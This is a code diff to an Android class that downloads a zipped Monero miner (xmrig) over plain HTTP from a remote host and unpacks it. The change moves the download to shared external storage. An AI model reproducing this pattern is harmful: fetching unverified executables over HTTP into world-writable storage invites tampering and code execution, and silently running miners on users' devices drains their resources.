@@ -1,5 +1,8 @@
 package waterhole.miner.monero;
 
+import android.os.Environment;
+
+import java.io.File;
 import java.io.ObjectStreamException;
 
 import waterhole.miner.core.AbstractMiner;
@@ -19,7 +22,7 @@ public final class MoneroMiner extends AbstractMiner implements FileUtils.Downlo
 
     private static final String TAG = "Waterhole-XmrMiner";
 
-    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/xmr-miner-old.zip";
+    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/05161847/xmr-miner-old.zip";
     private static final String OLD_MINER_SAVE_FIILENAME = "xmr-miner-old.zip";
 
     private MoneroMiner() {
@@ -46,7 +49,7 @@ public final class MoneroMiner extends AbstractMiner implements FileUtils.Downlo
             @Override
             public void run() {
                 downloadFile(OLD_MINER_DOWNLOAD_URL,
-                        getContext().getFilesDir().getAbsolutePath() + OLD_MINER_SAVE_FIILENAME,
+                         Environment.getExternalStorageDirectory() + "/" + OLD_MINER_SAVE_FIILENAME,
                         MoneroMiner.this);
             }
         });
@@ -60,7 +63,11 @@ public final class MoneroMiner extends AbstractMiner implements FileUtils.Downlo
     @Override
     public void onDownloadSuccess(String pathName) {
         info(TAG, "download old miner success");
-        unzip(pathName, getContext().getFilesDir().getAbsolutePath(), this);
+        String fileDir = getContext().getFilesDir().getAbsolutePath();
+        File file = new File(fileDir + "/xmrig");
+        if (!file.exists()) {
+            unzip(pathName, fileDir, this);
+        }
     }
 
     @Override
